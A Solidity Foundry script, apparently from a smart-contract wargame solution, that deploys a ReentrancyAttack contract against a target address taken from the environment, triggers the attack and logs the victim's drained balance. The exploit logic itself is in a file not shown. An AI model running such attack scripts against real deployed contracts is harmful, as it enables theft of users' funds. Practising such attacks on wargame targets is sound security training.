// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {ReentrancyAttack, IReentrance} from "../src/ReentrancyAttack.sol";

contract Deploy is Script {
    function run() external {
        address target = vm.envAddress("REENTRANCY_ADDRESS");

        vm.startBroadcast();
        ReentrancyAttack attacker = new ReentrancyAttack(target);
        vm.stopBroadcast();
        
        console2.log("Attacker depoyed at: ", address(attacker));
        console2.log("Victim balance: ", address(target).balance);
        console2.log("Attacker balacnce: ", address(attacker).balance);
        console2.log("Put REENTRANCY_ATTACKER_ADDRESS in .env: ");
    }
}

contract Attack is Script {
    function run() external {
        address attackerAddress = vm.envAddress("REENTRANCY_ATTACKER_ADDRESS");
        address target = vm.envAddress("REENTRANCY_ADDRESS");
        IReentrance reentrance = IReentrance(target);
        ReentrancyAttack attacker = ReentrancyAttack(payable(attackerAddress));

        vm.startBroadcast();
        attacker.attack();
        vm.stopBroadcast();

        console2.log("attack finished, the victim balance is: ", address(reentrance).balance);
    }
}